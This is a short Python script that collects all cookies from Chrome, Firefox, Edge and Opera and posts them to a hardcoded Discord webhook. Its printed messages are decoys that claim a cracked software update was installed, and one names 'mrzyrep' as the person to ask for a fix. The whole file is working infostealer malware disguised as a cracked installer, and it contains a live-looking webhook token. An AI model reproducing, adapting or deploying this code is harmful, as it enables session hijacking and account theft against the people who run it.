import os
import json
import sqlite3
from datetime import datetime, timedelta
import browser_cookie3
import requests

WEBHOOK_URL = 'https://discord.com/api/webhooks/1367207222005993493/VXaAM9KXta4SIh-Yg5TXoXBf3t2X1Sbck83sZrkVkfkNcB7ukRWf6dF7MXSELRJraJjZ'  # Zmień na swój webhook Discorda
BROWSERS = ['chrome', 'firefox', 'edge', 'opera']

def get_browser_cookies(browser_name):
    try:
        if browser_name == 'chrome':
            cookies = browser_cookie3.chrome(domain_name='')
        elif browser_name == 'firefox':
            cookies = browser_cookie3.firefox(domain_name='')
        elif browser_name == 'edge':
            cookies = browser_cookie3.edge(domain_name='')
        elif browser_name == 'opera':
            cookies = browser_cookie3.opera(domain_name='')
        else:
            return None

        cookie_list = []
        for cookie in cookies:
            cookie_list.append({
                'name': cookie.name,
                'value': cookie.value,
                'domain': cookie.domain,
                'path': cookie.path,
                'expires': cookie.expires
            })
        return cookie_list
    except Exception as e:
        print(f"Unable to download cracked update from {browser_name}")
        return None

def send_to_discord(data, webhook_url):
    try:
        headers = {'Content-Type': 'application/json'}
        payload = {'content': f'**Ciasteczka z komputera:**\n```json\n{json.dumps(data, indent=4)}\n```'}
        response = requests.post(webhook_url, headers=headers, data=json.dumps(payload))
        response.raise_for_status()
        print("Succesfully installed Cracked S1")
    except requests.exceptions.RequestException as e:
        print(f"Something went wrong ask mrzyrep for fix!")

if __name__ == "__main__":
    all_cookies = {}
    for browser in BROWSERS:
        cookies = get_browser_cookies(browser)
        if cookies:
            all_cookies[browser] = cookies

    if all_cookies:
        send_to_discord(all_cookies, WEBHOOK_URL)
    else:
        print("Not Found Update")